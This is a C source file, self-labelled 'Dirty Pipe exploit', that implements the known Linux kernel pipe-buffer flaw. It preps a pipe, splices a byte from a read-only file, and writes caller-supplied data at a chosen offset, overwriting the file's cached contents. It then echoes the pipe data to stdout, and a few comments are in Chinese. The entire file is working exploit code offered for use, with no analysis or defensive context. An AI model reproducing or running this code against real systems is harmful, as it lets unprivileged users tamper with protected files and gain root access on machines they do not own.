#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
    if (pipe(p)) {
        abort();
    }

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    for (unsigned r = (pipe_size); r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        r -= write(p[1], buffer, n);
    }

    for (unsigned r = (pipe_size); r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        r -= read(p[0], buffer, n);
    }
}

int main(int argc, char **argv)
{
    if (argc != 4) return EXIT_FAILURE;
    puts("Dirty Pipe exploit");
    const char *path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);


    int fd = open(path, O_RDONLY);
    if (fd < 0) return EXIT_FAILURE;

    struct stat st;
    if (fstat(fd, &st) || offset > st.st_size || 
       (offset + data_size) > st.st_size) {
        return EXIT_FAILURE;
    }

    int p[2];
    prepare_pipe(p);
    offset--;

    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes <= 0) return EXIT_FAILURE;

    if (write(p[1], data, data_size) != data_size) {
        return EXIT_FAILURE;
    }

    // 将管道中的数据全部读取并输出到标准输出
    char output_buffer[PAGE_SIZE];
    ssize_t bytes_read;
    printf("Data in the pipe:!!\n");
    while (bytes_read = read(p[0], output_buffer, sizeof(output_buffer))) 
    {
        if (bytes_read < 0) {
            perror("read");
            break;
        }
        write(STDOUT_FILENO, output_buffer, bytes_read); // 输出到标准输出
    }
    printf("It worked!!!\n");
    return EXIT_SUCCESS;
}

